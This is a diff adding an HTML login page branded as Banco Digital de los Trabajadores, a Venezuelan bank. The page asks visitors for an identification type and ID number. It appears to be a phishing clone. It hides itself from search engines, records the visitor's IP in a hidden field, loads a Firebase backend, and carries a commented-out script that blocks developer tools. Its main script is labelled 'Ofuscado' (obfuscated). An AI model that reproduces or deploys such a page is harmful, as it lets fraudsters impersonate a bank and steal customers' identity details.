@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="robots" content="noindex, nofollow">
+
+  <title>Bicentenario</title>
+  <meta name="description" content />
+  <meta name="author" content="Luis Eduardo Perez" />
+  <meta name="description" content />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <link rel="stylesheet" href="styles/style.css" />
+  <meta name="msapplication-TileColor" content="#b91d47" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="referrer" content="no-referrer" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <!-- Favicon -->
+  <link rel="icon" href="img/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="img/shorcut.png" type="image/x-icon" />
+  <link rel="icon" href="img/favicon.png" type="image/x-icon" />
+  <script type="module" src="js/firebase-config.js"></script>
+</head>
+
+<body class="smart-style-3 fixed-page-footer fixed-header desktop-detected">
+  <!-- <script>
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    document.onkeydown = function(e) {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+        return false;
+      }
+    };
+    setTimeout(() => {
+  if (window.console) {
+    console.log('%c¡Detente!', 'color: red; font-size: 40px; font-weight: bold;');
+    console.log('%cEsta función es solo para desarrolladores. No pegues aquí nada que no entiendas.', 'font-size: 16px;');
+    console.log('Ver más en: https://ejemplo.com/selfxss');
+  }
+}, 1000);
+
+  </script> -->
+  <div id="main" role="main" class="mainRegister">
+    <div id="content" class="container" style="opacity: 1">
+      <div id="lgform" novalidate>
+        <input type="hidden" id="direccionIP" name="DireccionIP" />
+        <div class="modal-dialog demo-modal">
+          <div class="modal-content">
+            <div class="modal-header">
+              <!-- Logo BDT sobre form -->
+              <h4 class="modal-title text-center mt-1">
+                <img src="img/logo.png" alt srcset style="width: 80%" sizes />
+              </h4>
+              <!-- Fin logo -->
+            </div>
+            <div class="modal-body smart-form client-form">
+              <div class="row">
+                <section class="col col-2"></section>
+                <section class="col col-8">
+                  <label for class="label">
+                    <strong>Tipo de Identificación</strong>
+                  </label>
+                  <label for class="select radius-5">
+                    <select class="form-control input-login" id="tipodocben">
+                      <option value="Venezolano" selected>Venezolano</option>
+                      <option value="Pasaporte">Pasaporte</option>
+                      <option value="Jurídico">Jurídico</option>
+                      <option value="Extranjero">Extranjero</option>
+                      <option value="Gubernamental">Gubernamental</option>
+                      <option value="Comunal">Comunal</option>
+                      <option value="Firma Personal">Firma Personal</option>
+                    </select>
+                    <b class="tooltip tooltip-top-right"><i class="fa fa-lock txt-color-teal"></i> Tipo de
+                      Documento de Identidad</b>
+                    <i></i>
+                  </label>
+                </section>
+              </div>
+              <div class="row">
+                <section class="col col-2"></section>
+                <section class="col col-8">
+                  <label for class="label">
+                    <strong>Número de Identificación</strong>
+                  </label>
+                  <label for="documento" class="input show-account">
+                    <i style="cursor: pointer" class="icon-watch icon-append fa fa-eye-slash" data-watch="0"
+                      id="toggleDocumento" aria-label="Mostrar u ocultar documento" tabindex="0" role="button"></i>
+                    <input type="password" class="form-control numbersOnly input-login" maxlength="10" name="Documento"
+                      id="documento" autocomplete="off" placeholder="Número de documento de identidad" />
+                    <b class="tooltip tooltip-top-right">
+                      <i class="fa fa-lock txt-color-teal"></i>
+                      Número de Documento de Identidad
+                    </b>
+                  </label>
+                </section>
+              </div>
+              <div id="preloader" class="cargando text-center">
+                Cargando, Por favor espere un momento...
+                <span class="spinner loader"></span>
+              </div>
+              <div class="botones">
+                <div class="row mt-1">
+                  <section class="col col-2"></section>
+                  <section class="col col-8">
+                    <button type="submit" class="btn bg-color-azul btn-block btn-azul-ingreso" id="cmdLogin" disabled>
+                      Ingresar
+                    </button>
+                  </section>
+                </div>
+                <div class="row mt-1">
+                  <section class="col col-1"></section>
+                  <section class="col col-5 text-center">
+                    <a href="javascript:void(0)" type="button" class="btn-link-blue" id="cmdRegister" disabled style="font-size: 14px;">
+                      Registro
+                    </a>
+                  </section>
+                  <section class="col col-5 text-center">
+                    <a href="javascript:void(0)" class="btn-link-blue" id="cmdUnlock" disabled style="font-size: 14px;">
+                      Desbloqueo de usuario
+                    </a>
+                  </section>
+                </div>
+                <div class="row">
+                  <div class="col-md-3"></div>
+                  <div class="col-md-6 text-center">
+                    <a href="#" id="cmdOlvido" class="btn-link-blue" style="cursor: none;">
+                      Olvido usuario master
+                    </a>
+                  </div>
+                </div>
+              </div>
+              <div class="clearfix"></div>
+              <p class="text-center mt-1">
+                <strong class="note">
+                  Para mayor información o asesoria contáctanos al <br />
+                  Centro de atención telefónica<br />
+                  0500-6272421
+                </strong>
+              </p>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="page-footer text-start" id="footer">
+    <div class="m-3" style="padding-left: 10%">
+      <strong class="txt-color-white">
+        Banco Digital de los Trabajadores - RIF: G-20009148-7
+        <span class="hidden-xs"> Copyright 2025.</span> Todos los derechos
+        reservados.</strong>
+    </div>
+    <table class="pull-right" style="margin-top: -10px" width="135" border="0" cellpadding="2" cellspacing="0"
+      title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+      <tbody>
+        <tr>
+          <td width="135" align="center" valign="top"></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div id="divSmallBoxes"></div>
+  <div id="divMiniIcons"></div>
+  <div id="divbigBoxes"></div>
+<!-- Ofuscado -->
+  <script type="module" src="js/script.js"></script>
+
+</body>
+
+</html>
